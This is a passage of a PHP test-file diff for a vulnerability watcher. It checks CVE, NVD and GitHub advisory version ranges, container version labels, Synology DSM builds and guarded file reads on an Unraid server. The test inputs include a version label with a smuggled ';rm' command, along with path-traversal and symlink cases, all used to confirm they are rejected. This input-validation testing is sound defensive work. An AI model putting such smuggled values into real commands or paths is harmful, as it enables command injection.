+        $cpe(['versionStartIncluding' => '3.13', 'versionEndExcluding' => '3.14.4']),
+        ['vulnerable' => true, 'criteria' => 'cpe:2.3:o:linux:linux_kernel:2.6.31:-:*:*:*:*:*:*'],
+        ['vulnerable' => true, 'criteria' => 'cpe:2.3:o:linux:linux_kernel:2.6.31:rc3:*:*:*:*:*:*']]]]]]]]]], 'CVE-2014-0196');
+    $kc = WATCH_VULN_PRODUCTS['kernel']['cna'];
+    same('vuln letters: «after 2.6.31, before 3.2.59» kept with its end; 6.18.60 not affected (fixed from 3.14.4); 3.2.70 past it too; 3.4.80 in a clean range affected; 3.2.50 inside it can\'t be said',
+        [['version' => 'n/a', 'status' => 'affected', 'lessThan' => '3.2.59', 'start_excluding' => '2.6.31'], ['no', '3.14.4'], ['no', null], ['yes', '3.4.91'], 'maybe'],
+        [$k['affected'][0]['versions'][0], watchmanVulnVerdict($k, $kc, '6.18.60'), watchmanVulnVerdict($k, $kc, '3.2.70'), watchmanVulnVerdict($k, $kc, '3.4.80'),
+         watchmanVulnVerdict($k, $kc, '3.2.50')[0]]);
+    // a start excluding with an inclusive end (no «fixed in»), and a negated node: as before — never a clean no
+    $incl = watchmanVulnNvdReduce(['vulnerabilities' => [['cve' => ['id' => 'CVE-2014-0196', 'configurations' => [['nodes' => [['operator' => 'OR', 'negate' => false,
+        'cpeMatch' => [$cpe(['versionStartExcluding' => '2.6.31', 'versionEndIncluding' => '3.2.58'])]]]]]]]]], 'CVE-2014-0196');
+    same('vuln letters: «after 2.6.31, up to 3.2.58» (no «fixed in») stays can\'t be said for 6.18.60', [['version' => 'n/a', 'status' => 'affected'], 'maybe'],
+        [$incl['affected'][0]['versions'][0], watchmanVulnVerdict($incl, $kc, '6.18.60')[0]]);
+}
+
+/**
+ * What he checked (1.96, 2026-11-25): the page's block from the judged state — this server's programs (never a router's
+ * line), the containers with a version and those without, how many there are; the lists capped, the counts whole; an
+ * older state has none of it.
+ */
+function testWatchmanVulnLook(): void
+{
+    $images = ['nextcloud' => ['PHP_VERSION' => '8.3.4', 'NGINX_VERSION' => '1.27.1'], 'plex' => [], 'unifi' => ['OCI_VERSION' => '9.0.114']];
+    $inv = watchmanVulnInventory(['php' => '8.4.28', 'kernel' => '6.12.54-Unraid', 'vuln_images' => $images,
+        'vuln_routers' => [['product' => 'routeros', 'version' => '7.16.2', 'at' => null, 'sender' => '192.0.2.1']]]);
+    $look = watchmanVulnLook($inv, ['nextcloud', 'plex', 'unifi', 'gone']);
+    same('vuln look: this server (no router\'s line), the containers read by name, 3 of 4, the others by name',
+        [[['kernel', '6.12.54-Unraid'], ['php', '8.4.28']], [['nextcloud', 'nginx', '1.27.1'], ['nextcloud', 'php', '8.3.4'], ['unifi', 'unifi', '9.0.114']], 4, 2, ['gone', 'plex'], 2],
+        [array_map(fn ($x) => [$x['product'], $x['version']], $look['host']), array_map(fn ($x) => [$x['where'], $x['product'], $x['version']], $look['cts']),
+         $look['ct_total'], $look['ct_read'], $look['unread'], $look['unread_n']]);
+    same('vuln look: Docker didn\'t answer — no total, nothing unread', [null, 0, [], 0], array_values(array_intersect_key(watchmanVulnLook([], null), array_flip(['ct_total', 'ct_read', 'unread', 'unread_n']))));
+    // the caps: 300 containers, 150 with a version — lists at most WATCH_VULN_LOOK_MAX, the counts whole
+    $many = [];
+    $names = [];
+    for ($i = 0; $i < 300; $i++) {
+        $names[] = sprintf('ct%03d', $i);
+        if ($i < 150) {
+            $many[] = ['product' => 'php', 'version' => '8.4.1', 'clean' => '8.4.1', 'where' => sprintf('ct%03d', $i)];
+        }
+    }
+    $big = watchmanVulnLook($many, $names);
+    same('vuln look: capped lists, whole counts', [WATCH_VULN_LOOK_MAX, WATCH_VULN_LOOK_MAX, 300, 150, 150],
+        [count($big['cts']), count($big['unread']), $big['ct_total'], $big['ct_read'], $big['unread_n']]);
+    $tmp = hardeningTmp('vuln-look');
+    $j = watchmanVulnJudge($tmp, $inv, 1_800_000_000, $images, [], ['nextcloud', 'plex', 'unifi', 'gone']);
+    $page = watchmanVulnPage(['vuln_on' => true], $j + ['vms' => 3]);
+    same('vuln look: the page — labels, the counts, the VMs counted (never looked inside); junk rows dropped',
+        [[['Linux kernel', '6.12.54-Unraid'], ['PHP', '8.4.28']], ['nginx', 'PHP', 'UniFi Network'], 4, 2, ['gone', 'plex'], 3, ['plex']],
+        [array_map(fn ($x) => [$x['label'], $x['version']], $page['host']), array_column($page['cts'], 'label'), $page['ct_total'], $page['ct_read'], $page['unread'], $page['vms'],
+         $page['unknown']]);
+    same('vuln look: an older state — no block (host null), nothing else', [null, [], null, 0, [], null],
+        array_values(array_intersect_key(watchmanVulnPage(['vuln_on' => true], ['kev' => 1, 'cts' => ['junk', ['where' => 1]]]), array_flip(['host', 'cts', 'ct_total', 'ct_read', 'unread', 'vms']))));
+    hardeningRm($tmp);
+}
+
+/**
+ * The home server's software (2026-11-26): a product's version from its own ENV, or from the OCI version label of the
+ * images its pattern names (per product, each label in its product's shape — linuxserver's «-ls61», Jellyfin's «ubu2604»,
+ * Plex's build hash; a channel or a commit not read at all); one row a product and container, the ENV first; an older
+ * office's cache asked anew once. Synology DSM in virtual-dsm by the build its storage's dsm.ver names — read only when
+ * every disk behind the folder is awake, never through a link, last value kept while it sleeps; judged by build numbers
+ * (CVE-2024-10441), a lower bound: never «affected» by it, below a fix «can't be checked for sure» (reason «lower»).
+ */
+function testWatchmanVulnHome(): void
+{
+    same('vuln home: the labels in their product\'s shape — linuxserver, Jellyfin\'s distribution mark, Plex\'s hash, a «v»; a channel, a commit, nightly: not read',
+        ['12.4', '12.4', '1.43.5.11079', '1.43.5.11079', '3.4.2', '10.6.109', '35.0.3', null, null, null, null, null],
+        [watchmanVulnLabelClean('jellyfin', '12.4'), watchmanVulnLabelClean('jellyfin', '12.4ubu2604-ls61'), watchmanVulnLabelClean('plex', '1.43.5.11079-b3b13e506'),
+         watchmanVulnLabelClean('plex', '1.43.5.11079-b3b13e506-ls334'), watchmanVulnLabelClean('immich', 'v3.4.2'), watchmanVulnLabelClean('unifi', '10.6.109-ls153'),
+         watchmanVulnLabelClean('nextcloud', '35.0.3-ls4'), watchmanVulnLabelClean('vaultwarden', '1.37.5-dbd7829e'), watchmanVulnLabelClean('plex', 'beta'),
+         watchmanVulnLabelClean('n8n', 'nightly'), watchmanVulnLabelClean('mongodb', '22.04'), watchmanVulnLabelClean('jellyfin', '12.4ubu2604-ls61;rm')]);
+    same('vuln home: whose label an image carries — by its name, with or without a registry, a tag or a digest; never a lookalike',
+        [['jellyfin'], ['jellyfin'], ['immich'], ['plex'], ['plex'], ['phpmyadmin'], ['phpmyadmin'], [], ['elasticsearch'], ['elasticsearch'], [], [], [], ['unifi'], ['homeassistant']],
+        array_map('watchmanVulnOciProducts', ['lscr.io/linuxserver/jellyfin', 'jellyfin/jellyfin:latest', 'ghcr.io/immich-app/immich-server:v3', 'plexinc/pms-docker',
+            'lscr.io/linuxserver/plex@sha256:0123', 'phpmyadmin:5.2', 'lscr.io/linuxserver/phpmyadmin:latest', 'bitnami/phpmyadmin:5', 'elasticsearch:8.19.7',
+            'docker.elastic.co/elasticsearch/elasticsearch:8.19.7', 'mongo:7', 'ghcr.io/vdsm/virtual-dsm:latest', 'grafana/grafana', 'lscr.io/linuxserver/unifi-network-application:10.6.109-ls153',
+            'ghcr.io/home-assistant/home-assistant:stable']));
+
+    // what real containers show (a server's docker inspect, 2026-11-26)
+    $imgs = ['php:8.5.12-apache', 'grafana/grafana', 'jc21/nginx-proxy-manager', 'lscr.io/linuxserver/jellyfin', 'ghcr.io/immich-app/immich-server:v3', 'nextcloud-ocr:34',
+             'mongo:7', 'zabbix/zabbix-server-mysql:7.0', 'zabbix/zabbix-web-nginx-mysql:7.0', 'vaultwarden/server:testing', 'roundcube/roundcubemail:1.7', 'emby/embyserver:latest'];
+    $env = ['php:8.5.12-apache' => 'sha256:a1 PHP_VERSION=8.5.12', 'grafana/grafana' => 'sha256:a2', 'jc21/nginx-proxy-manager' => 'sha256:a3',
+            'lscr.io/linuxserver/jellyfin' => 'sha256:a4', 'ghcr.io/immich-app/immich-server:v3' => 'sha256:a5 NODE_VERSION=24.11.1',
+            'nextcloud-ocr:34' => 'sha256:a6 PHP_VERSION=8.4.15 NEXTCLOUD_VERSION=34.0.6', 'mongo:7' => 'sha256:a7 MONGO_VERSION=7.0.45',
+            'zabbix/zabbix-server-mysql:7.0' => 'sha256:a8 ZBX_VERSION=7.0.32', 'zabbix/zabbix-web-nginx-mysql:7.0' => 'sha256:a9 ZBX_VERSION=7.0.32',
+            'vaultwarden/server:testing' => 'sha256:b1', 'roundcube/roundcubemail:1.7' => 'sha256:b2 PHP_VERSION=8.4.15 ROUNDCUBEMAIL_VERSION=1.7.7', 'emby/embyserver:latest' => 'sha256:b3'];
+    $labels = ['lscr.io/linuxserver/jellyfin' => 'sha256:a4 OCI_VERSION=12.4ubu2604-ls61', 'ghcr.io/immich-app/immich-server:v3' => 'sha256:a5 OCI_VERSION=v3.4.2',
+               'mongo:7' => 'sha256:a7 OCI_VERSION=22.04', 'vaultwarden/server:testing' => 'sha256:b1 OCI_VERSION=1.37.5-dbd7829e',
+               'roundcube/roundcubemail:1.7' => 'sha256:b2 OCI_VERSION=1.7.7'];
+    $by = watchmanVulnImagesParse($env, $labels, $imgs);
+    same('vuln home: by image — Jellyfin and Immich by their label, Nextcloud and MongoDB by their ENV (mongo\'s label is Ubuntu\'s: never), ZBX_VERSION only of the web image, Vaultwarden\'s commit label not read',
+        [['PHP_VERSION' => '8.5.12'], [], [], ['OCI:jellyfin' => '12.4ubu2604-ls61'], ['NODE_VERSION' => '24.11.1', 'OCI:immich' => 'v3.4.2'],
+         ['PHP_VERSION' => '8.4.15', 'NEXTCLOUD_VERSION' => '34.0.6'], ['MONGO_VERSION' => '7.0.45'], [], ['ZBX_VERSION' => '7.0.32'], [],
+         ['PHP_VERSION' => '8.4.15', 'ROUNDCUBEMAIL_VERSION' => '1.7.7', 'OCI:roundcube' => '1.7.7'], []],
+        array_values($by));
+    $cts = ['web' => 'php:8.5.12-apache', 'grafana' => 'grafana/grafana', 'npm' => 'jc21/nginx-proxy-manager', 'jellyfin' => 'lscr.io/linuxserver/jellyfin',
+            'immich' => 'ghcr.io/immich-app/immich-server:v3', 'nextcloud' => 'nextcloud-ocr:34', 'mongo' => 'mongo:7', 'zbx' => 'zabbix/zabbix-server-mysql:7.0',
+            'zbxweb' => 'zabbix/zabbix-web-nginx-mysql:7.0', 'vw' => 'vaultwarden/server:testing', 'mail' => 'roundcube/roundcubemail:1.7', 'emby' => 'emby/embyserver:latest'];
+    $inv = watchmanVulnInventory(['php' => '8.4.28', 'kernel' => '6.12.54-Unraid', 'vuln_images' => array_map(fn ($i) => $by[$i], $cts)
+        + ['old' => ['OCI_VERSION' => '9.0.114-ls78']]]);
+    $rows = array_values(array_map(fn ($x) => [$x['where'], $x['product'], $x['version'], $x['clean']], array_filter($inv, fn ($x) => $x['where'] !== 'host')));
+    same('vuln home: the inventory — one row a product and container (Roundcube by its ENV, not twice), an older office\'s «OCI_VERSION» still UniFi',
+        [['web', 'php', '8.5.12', '8.5.12'], ['jellyfin', 'jellyfin', '12.4ubu2604-ls61', '12.4'], ['immich', 'nodejs', '24.11.1', '24.11.1'], ['immich', 'immich', 'v3.4.2', '3.4.2'],
+         ['nextcloud', 'php', '8.4.15', '8.4.15'], ['nextcloud', 'nextcloud', '34.0.6', '34.0.6'], ['mongo', 'mongodb', '7.0.45', '7.0.45'], ['zbxweb', 'zabbix', '7.0.32', '7.0.32'],
+         ['mail', 'php', '8.4.15', '8.4.15'], ['mail', 'roundcube', '1.7.7', '1.7.7'], ['old', 'unifi', '9.0.114-ls78', '9.0.114']], $rows);
+    $look = watchmanVulnLook($inv, array_keys($cts));
+    same('vuln home: of the 12 containers 8 read; Grafana, the proxy manager, Zabbix\'s server, Vaultwarden\'s testing tag and Emby stay honestly unread',
+        [12, 7, ['emby', 'grafana', 'npm', 'vw', 'zbx']], [$look['ct_total'], $look['ct_read'], $look['unread']]);
+
+    // the labels asked only of the images a product names; an older office's cache (no `v`) asked anew once
+    $asked = [];
+    $docker = function (array $refs, string $format) use ($env, $labels, &$asked): array {
+        $isLabel = str_contains($format, 'Labels');
+        $asked[] = [$isLabel, $refs];
+        return [0, implode("\n", array_map(fn ($r) => $isLabel ? ($labels[$r] ?? explode(' ', $env[$r])[0]) : $env[$r], $refs)) . "\n"];
+    };
+    $t0 = strtotime('2026-11-26 12:00:00');
+    $ctsImg = array_map(fn ($i) => ['image' => $i], $cts);
+    $oldCache = ['time' => $t0 - 60, 'images' => array_fill_keys((function () use ($cts) { $r = array_values(array_unique($cts)); sort($r); return $r; })(), [])];
+    [$byCt, $cache] = watchmanVulnImages($ctsImg, $oldCache, $t0, $docker);
+    same('vuln home: an older office\'s cache asked anew; the label asked only of Immich, Jellyfin, Roundcube, Vaultwarden; kept with `v` 2',
+        [[false, true], [['ghcr.io/immich-app/immich-server:v3', 'lscr.io/linuxserver/jellyfin', 'roundcube/roundcubemail:1.7', 'vaultwarden/server:testing']], 2, ['OCI:jellyfin' => '12.4ubu2604-ls61']],
+        [array_column($asked, 0), array_slice(array_column($asked, 1), 1), $cache['v'] ?? null, $byCt['jellyfin']]);
+    $asked = [];
+    watchmanVulnImages($ctsImg, $cache, $t0 + 600, $docker);
+    same('vuln home: within the hour not asked again', [], $asked);
+
+    // Synology DSM: CVE-2024-10441 as its record writes it
+    $dsm = watchmanVulnReduce(['cveMetadata' => ['cveId' => 'CVE-2024-10441', 'datePublished' => '2025-03-19T03:13:07.000Z'], 'containers' => ['cna' => ['affected' => [
+        ['vendor' => 'Synology', 'product' => 'DiskStation Manager (DSM)', 'defaultStatus' => 'affected', 'versions' => [
+            ['version' => '7.2.2', 'lessThan' => '7.2.2-72806-1', 'status' => 'affected', 'versionType' => 'semver'],
+            ['version' => '7.2.1', 'lessThan' => '7.2.1-69057-6', 'status' => 'affected', 'versionType' => 'semver'],
+            ['version' => '7.2', 'lessThan' => '7.2-64570-4', 'status' => 'affected', 'versionType' => 'semver'],
+            ['version' => '7.1', 'lessThan' => '7.1.1-42962-7', 'status' => 'affected', 'versionType' => 'semver'],
+            ['version' => '0', 'lessThan' => '7.0', 'status' => 'unknown', 'versionType' => 'semver']]],
+        ['vendor' => 'Synology', 'product' => 'BeeStation OS (BSM)', 'defaultStatus' => 'affected', 'versions' => [
+            ['version' => '1.1', 'lessThan' => '1.1-65374', 'status' => 'affected', 'versionType' => 'semver']]]]]]]);
+    $sc = WATCH_VULN_PRODUCTS['synology']['cna'];
+    same('vuln home, DSM: by build — 7.4.1 (90080) past every fix: not affected, fixed from 7.2.2-72806-1; 72806 and 42218 below a fix: can\'t be said (it may have updated itself); a build not readable: maybe',
+        [['no', '7.2.2-72806-1'], ['maybe', null, 'lower', '72806'], ['maybe', null, 'lower', '42218'], ['maybe', null], ['maybe', null], ['no', '7.2.2-72806-1']],
+        [watchmanVulnBuildVerdict($dsm, $sc, '90080'), watchmanVulnBuildVerdict($dsm, $sc, '72806'), watchmanVulnBuildVerdict($dsm, $sc, '42218'),
+         watchmanVulnBuildVerdict($dsm, $sc, '7.4.1'), watchmanVulnBuildVerdict(null, $sc, '90080'), watchmanVulnBuildVerdict($dsm, $sc, '72807')]);
+    $open = $dsm;
+    $open['affected'][0]['versions'][] = ['version' => '7.3', 'status' => 'affected'];
+    $later = $dsm;
+    $later['affected'][0]['versions'][] = ['version' => '0', 'lessThan' => '8.0', 'status' => 'unknown'];
+    same('vuln home, DSM: an affected range without an end, an end past the builds\' lines that names no build — can\'t be said',
+        [['maybe', null], ['maybe', null]], [watchmanVulnBuildVerdict($open, $sc, '90080'), watchmanVulnBuildVerdict($later, $sc, '90080')]);
+    $nvd = watchmanVulnNvdReduce(['vulnerabilities' => [['cve' => ['id' => 'CVE-2024-10441', 'configurations' => [['nodes' => [['operator' => 'OR', 'negate' => false, 'cpeMatch' => [
+        ['vulnerable' => true, 'criteria' => 'cpe:2.3:o:synology:diskstation_manager:*:*:*:*:*:*:*:*', 'versionStartIncluding' => '7.2', 'versionEndExcluding' => '7.2-64570-4'],
+        ['vulnerable' => true, 'criteria' => 'cpe:2.3:o:synology:diskstation_manager:*:*:*:*:*:*:*:*', 'versionStartIncluding' => '7.2.1-69057', 'versionEndExcluding' => '7.2.1-69057-6'],
+        ['vulnerable' => true, 'criteria' => 'cpe:2.3:o:synology:diskstation_manager:*:*:*:*:*:*:*:*', 'versionStartIncluding' => '7.2.2', 'versionEndExcluding' => '7.2.2-72806-1']]]]]]]]]], 'CVE-2024-10441');
+    same('vuln home, DSM: NVD\'s CPE ranges judged the same way', [['no', '7.2.2-72806-1'], ['maybe', null, 'lower', '69057']],
+        [watchmanVulnBuildVerdict($nvd, $sc, '90080'), watchmanVulnBuildVerdict($nvd, $sc, '69057')]);
+    same('vuln home: KEV\'s names', ['synology', 'plex', 'mongodb', 'n8n', 'roundcube', 'roundcube', 'zabbix', 'jenkins', 'httpd', 'tomcat'],
+        array_map(fn ($x) => watchmanVulnKevProduct(...$x), [['Synology', 'DiskStation Manager (DSM)'], ['Plex', 'Media Server'], ['MongoDB', 'MongoDB and MongoDB Server'],
+            ['n8n', 'n8n'], ['Roundcube', 'Roundcube Webmail'], ['Roundcube', 'Webmail'], ['Zabbix', 'Frontend'], ['Jenkins', 'Jenkins'], ['Apache', 'HTTP Server'], ['Apache', 'Tomcat']]));
+    check('vuln home: every product\'s ENV is one docker is asked for; every slug, pattern and form a real one', !array_filter(WATCH_VULN_PRODUCTS,
+        fn ($p) => (isset($p['env']) && !in_array($p['env'], WATCH_VULN_ENV, true)) || (isset($p['eol']) && !preg_match('/^[a-z0-9-]{1,40}$/D', $p['eol']))
+            || (isset($p['oci']) && @preg_match($p['oci'], '') === false) || (isset($p['oci_form']) && @preg_match($p['oci_form'], '') === false)
+            || (isset($p['image']) && @preg_match($p['image'], '') === false)));
+
+    // judged: DSM 90080 not affected, 72806 calm; Plex's «yes» calm too (it may install another at its start); never an entry
+    $tmp = hardeningTmp('vuln-home');
+    $dir = "$tmp/data";
+    @mkdir(watchmanVulnDir($dir) . '/cve', 0700, true);
+    $plexRec = watchmanVulnReduce(['cveMetadata' => ['cveId' => 'CVE-2026-96652'], 'containers' => ['cna' => ['affected' => [['vendor' => 'Plex', 'product' => 'Media Server',
+        'defaultStatus' => 'unknown', 'versions' => [['version' => '0', 'lessThan' => '1.43.3.10861', 'status' => 'affected', 'versionType' => 'custom'],
+            ['version' => '1.43.3.10861', 'status' => 'unaffected', 'versionType' => 'custom']]]]]]]);
+    writeAtomic(watchmanVulnDir($dir) . '/kev.json', jsonEncode(['v' => 1, 'fetched' => $t0, 'count' => 1500, 'entries' => [
+        ['cve' => 'CVE-2024-10441', 'product' => 'synology', 'name' => 'Synology DiskStation Manager (DSM) Code Injection Vulnerability', 'added' => '2026-11-18'],
+        ['cve' => 'CVE-2026-96652', 'product' => 'plex', 'name' => 'Plex Media Server Vulnerability', 'added' => '2026-11-01']]]), 0600, 0, 0);
+    writeAtomic(watchmanVulnDir($dir) . '/status.json', jsonEncode(['kev' => ['try' => $t0, 'ok' => $t0]]), 0600, 0, 0);
+    writeAtomic(watchmanVulnDir($dir) . '/cve/CVE-2024-10441.json', jsonEncode(['v' => 1, 'fetched' => $t0] + $dsm), 0600, 0, 0);
+    writeAtomic(watchmanVulnDir($dir) . '/cve/CVE-2026-96652.json', jsonEncode(['v' => 1, 'fetched' => $t0] + $plexRec), 0600, 0, 0);
+    $images = ['dsm' => ['FILE:synology' => '90080'], 'dsm-old' => ['FILE:synology' => '72806'], 'plex' => ['OCI:plex' => '1.42.2.10156-f737b826c-ls280'],
+               'plex-new' => ['OCI:plex' => '1.43.5.11079-b3b13e506']];
+    $j = watchmanVulnJudge($dir, watchmanVulnInventory(['php' => '8.4.28', 'kernel' => '6.12.54-Unraid', 'vuln_images' => $images]), $t0 + 60, $images);
+    same('vuln home: judged — DSM 90080 and the new Plex not affected; DSM 72806 and the older Plex calm, reason «lower», never found',
+        [[['CVE-2024-10441', 'dsm', '7.2.2-72806-1'], ['CVE-2026-96652', 'plex-new', null]], [['CVE-2024-10441', 'dsm-old', 'lower', '72806'],
+         ['CVE-2026-96652', 'plex', 'lower', '1.42.2.10156-f737b826c-ls280']], []],
+        [array_map(fn ($x) => [$x['cve'], $x['where'], $x['fixed']], $j['not']), array_map(fn ($x) => [$x['cve'], $x['where'], $x['why'] ?? null, $x['bound'] ?? null], $j['unsure']), $j['found']]);
+    // NVD is not asked for a row unsure only by its lower bound
+    writeAtomic("$dir/state.json", jsonEncode(['vuln_look' => ['unsure' => $j['unsure'] + [9 => ['cve' => 'CVE-2024-10441', 'why' => 'rough']]]]), 0600, 0, 0);
+    $nvdAsked = [];
+    $kevBig = ['vulnerabilities' => array_merge([['cveID' => 'CVE-2024-10441', 'vendorProject' => 'Synology', 'product' => 'DiskStation Manager (DSM)'],
+        ['cveID' => 'CVE-2026-96652', 'vendorProject' => 'Plex', 'product' => 'Media Server']],
+        array_map(fn ($i) => ['cveID' => sprintf('CVE-2023-%05d', 50000 + $i), 'vendorProject' => 'Example', 'product' => "X$i"], range(1, 120)))];
+    watchmanVulnFetch($dir, ['now' => $t0 + 86400, 'sleep' => fn () => null, 'get' => function (string $url) use (&$nvdAsked, $kevBig): array {
+        if (str_contains($url, 'nvd.nist.gov')) {
+            $nvdAsked[] = substr($url, strrpos($url, '=') + 1);
+        }
+        return $url === WATCH_VULN_URLS['kev'] ? ['code' => 200, 'body' => json_encode($kevBig), 'lm' => null, 'err' => null] : ['code' => 404, 'body' => '', 'lm' => null, 'err' => 'HTTP 404'];
+    }]);
+    same('vuln home: NVD asked only for the unsure row that isn\'t a lower bound', ['CVE-2024-10441'], $nvdAsked);
+
+    // reading dsm.ver: only with every disk behind the folder awake, never through a link, at most 64 bytes, exactly its shape
+    $mnt = "$tmp/mnt";
+    foreach (['user/vdsm', 'user/excl', 'cache/excl', 'cache/vdsm', 'disk1/vdsm', 'user/linked', 'elsewhere', 'remotes/nas'] as $d2) {
+        @mkdir("$mnt/$d2", 0700, true);
+    }
+    file_put_contents("$mnt/user/vdsm/dsm.ver", "DSM_VirtualDSM_90080\n");
+    file_put_contents("$mnt/cache/excl/dsm.ver", "DSM_VirtualDSM_72806\n");
+    @rmdir("$mnt/user/excl");
+    symlink('../cache/excl', "$mnt/user/excl");
+    symlink("$mnt/elsewhere", "$mnt/user/linked/sub");
+    file_put_contents("$mnt/elsewhere/dsm.ver", "DSM_VirtualDSM_90080\n");
+    @mkdir("$mnt/user/odd", 0700, true);
+    file_put_contents("$mnt/user/odd/dsm.ver", "DSM_VirtualDSM\n");
+    @mkdir("$mnt/user/big", 0700, true);
+    file_put_contents("$mnt/user/big/dsm.ver", str_repeat('x', 100));
+    @mkdir("$mnt/user/lnk", 0700, true);
+    symlink("$mnt/elsewhere/dsm.ver", "$mnt/user/lnk/dsm.ver");
+    $shares = ['vdsm' => ['name' => 'vdsm', 'useCache' => 'yes', 'cachePool' => 'cache'], 'excl' => ['name' => 'excl', 'useCache' => 'only', 'cachePool' => 'cache', 'exclusive' => 'yes'],
+               'linked' => ['name' => 'linked', 'useCache' => 'only', 'cachePool' => 'cache'], 'odd' => ['name' => 'odd', 'useCache' => 'only', 'cachePool' => 'cache'],
+               'big' => ['name' => 'big', 'useCache' => 'only', 'cachePool' => 'cache'], 'lnk' => ['name' => 'lnk', 'useCache' => 'only', 'cachePool' => 'cache']];
+    $awake = ['cache' => ['name' => 'cache', 'type' => 'Cache', 'fsType' => 'btrfs', 'spundown' => '0', 'rotational' => '0'],
+              'disk1' => ['name' => 'disk1', 'type' => 'Data', 'fsType' => 'xfs', 'spundown' => '0', 'rotational' => '1']];
+    $asleep = $awake;
+    $asleep['disk1']['spundown'] = '1';
+    $read = fn (string $src, array $disks = []) => watchmanVulnFileRead($src, 'dsm.ver', $shares, $disks ?: $awake, $mnt);
+    same('vuln home, dsm.ver: a share on the pool and the array awake — read; its array disk asleep — not now; an exclusive share on its pool; a pool path itself',
+        ['90080', false, '72806', null],
+        [$read('/mnt/user/vdsm'), $read('/mnt/user/vdsm', $asleep), $read('/mnt/user/excl'), $read('/mnt/cache/vdsm')]);
+    same('vuln home, dsm.ver: a share emhttp doesn\'t list, a place without disks, a disk he doesn\'t know, «..» — not read; a link below /mnt, a linked file, too big, another shape — nothing',
+        [false, false, false, false, null, null, null, null, false],
+        [$read('/mnt/user/unknown'), $read('/mnt/remotes/nas'), $read('/mnt/disk9/vdsm'), $read('/mnt/user/vdsm/../excl'), $read('/mnt/user/linked/sub'), $read('/mnt/user/lnk'),
+         $read('/mnt/user/big'), $read('/mnt/user/odd'), watchmanVulnFileRead('/mnt/user/vdsm', '../x', $shares, $awake, $mnt)]);
+    same('vuln home: the mount only of virtual-dsm\'s image, only at /storage', [['synology' => '/mnt/user/vdsm'], [], []],
+        [watchmanVulnMounts('vdsm/virtual-dsm:latest', [['Type' => 'bind', 'Source' => '/mnt/user/vdsm/', 'Destination' => '/storage'], ['Type' => 'bind', 'Source' => '/mnt/user/x', 'Destination' => '/other']]),
+         watchmanVulnMounts('ghcr.io/vdsm/virtual-dsm', [['Type' => 'volume', 'Source' => '/var/lib/docker/volumes/x/_data', 'Destination' => '/storage']]),
+         watchmanVulnMounts('lscr.io/linuxserver/plex', [['Type' => 'bind', 'Source' => '/mnt/user/vdsm', 'Destination' => '/storage']])]);
+    // once an hour; asleep: the last value stays; never read and asleep: «couldn't read this time»
+    $paths = ['mnt' => $mnt, 'shares_ini' => "$tmp/shares.ini", 'disks_ini' => "$tmp/disks.ini"];
+    $ini = fn (array $a) => implode('', array_map(fn ($k, $v) => "[$k]\n" . implode('', array_map(fn ($kk, $vv) => "$kk=\"$vv\"\n", array_keys($v), $v)), array_keys($a), $a));
+    file_put_contents($paths['shares_ini'], $ini($shares));
+    file_put_contents($paths['disks_ini'], $ini($awake));
+    $c = ['dsm' => ['image' => 'ghcr.io/vdsm/virtual-dsm', 'vuln_mounts' => ['synology' => '/mnt/user/vdsm']], 'web' => ['image' => 'php:8.4']];
+    [$f1, $l1, $fc1] = watchmanVulnFiles($c, $paths, null, $t0);
+    file_put_contents("$mnt/user/vdsm/dsm.ver", "DSM_VirtualDSM_90081\n");
+    [$f2] = watchmanVulnFiles($c, $paths, $fc1, $t0 + 600);
+    file_put_contents($paths['disks_ini'], $ini($asleep));
+    [$f3, $l3] = watchmanVulnFiles($c, $paths, $fc1, $t0 + 7200);
+    [$f4, $l4, $fc4] = watchmanVulnFiles($c, $paths, null, $t0 + 7200);
+    same('vuln home: dsm.ver read, not again within the hour; asleep later — the last value kept; never read and asleep — «couldn\'t read this time»; Docker silent: nothing',
+        [['dsm' => ['FILE:synology' => '90080']], [], ['dsm' => ['FILE:synology' => '90080']], ['dsm' => ['FILE:synology' => '90080']], [], [], ['dsm'], ['files' => []], [[], [], null]],
+        [$f1, $l1, $f2, $f3, $l3, $f4, $l4, $fc4, watchmanVulnFiles(null, $paths, null, $t0)]);
+    hardeningRm($tmp);
+}
+
+/**
+ * The projects' own advisories (2026-11-26, agent/desks/watchman-vuln-advisories.php): GitHub's repository security
+ * advisories as a second source of «Known vulnerabilities» — the maintainers' range words read strictly (one lower and one
+ * upper bound, a version alone; anything else unsure with their words), judged by the CVE records' machinery; asked only
+ * for the products found in a container here, paged and capped, a cut list honest about what it covers; shown as a tip
+ * and calm rows, never an entry. With it the two small things of the same day: the records' part has a time bound, an
+ * interrupted job keeps its day, and a record that came in the job asks NVD the same day (Plex 1.43.4 and CVE-2020-5741).
+ */
+function testWatchmanVulnAdvisories(): void
+{
+    // the maintainers' words → bounds (null: not comparable)
+    same('vuln advisories: the range words — «<», «<=», «≤», «>», «>=», «=», a version alone, a «v»; two upper bounds, a branch, a commit, «All», an rc, «2.13.0-2.20.6»: not comparable',
+        [['hi' => '1.132.0', 'hi_incl' => false], ['hi' => '1.37.3', 'hi_incl' => true], ['hi' => '1.36.0', 'hi_incl' => true],
+         ['lo' => '1.33.0', 'lo_incl' => true, 'hi' => '1.37.3', 'hi_incl' => true], ['lo' => '1.36.0', 'lo_incl' => false, 'hi' => '1.37.0', 'hi_incl' => false],
+         ['eq' => '0.107.72'], ['eq' => '1.35.3'], ['lo' => '10.8.0', 'lo_incl' => true],
+         null, null, null, null, null, null, null, null, null],
+        array_map('watchmanVulnGhsaBounds', ['< 1.132.0', '<=1.37.3', '≤ 1.36.0 ', '>= 1.33.0, <= 1.37.3', '>1.36.0, < 1.37.0', 'v0.107.72', '= 1.35.3', '>=10.8.0',
+            '<= 9.1.1, <= 9.0.5', '2.6.x', '> main@4ffa26c9', 'All', '<= 9.2.0-rc2', '2.13.0-2.20.6', '2025.1.4<', '', '>= 3, < 2']));
+    same('vuln advisories: the fixed words — one or several clean versions; «N/A», «TBD», «6.2.X», words: none',
+        [['1.37.4'], ['1.132.0'], ['9.2.0', '9.1.4'], null, null, null, null],
+        array_map(fn ($f) => watchmanVulnGhsaFixed([$f]), ['1.37.4', '>= v1.132.0', '9.2.0, 9.1.4', 'N/A', 'TBD', '6.2.X, 7.2.X', '2025.10.2 and newer']));
+
+    $adv = fn (array $ranges, array $fixed) => ['id' => 'GHSA-aaaa-bbbb-cccc', 'ranges' => $ranges, 'fixed' => $fixed];
+    $cases = [
+        // [ranges, fixed, have] => verdict (as the real advisories wrote them, 2026-11-26)
+        [['<= 1.37.3'], ['1.37.4'], '1.37.3'], [['<= 1.37.3'], ['1.37.4'], '1.37.5'], [['>= 1.33.0, <= 1.37.3'], ['1.37.4'], '1.32.6'],
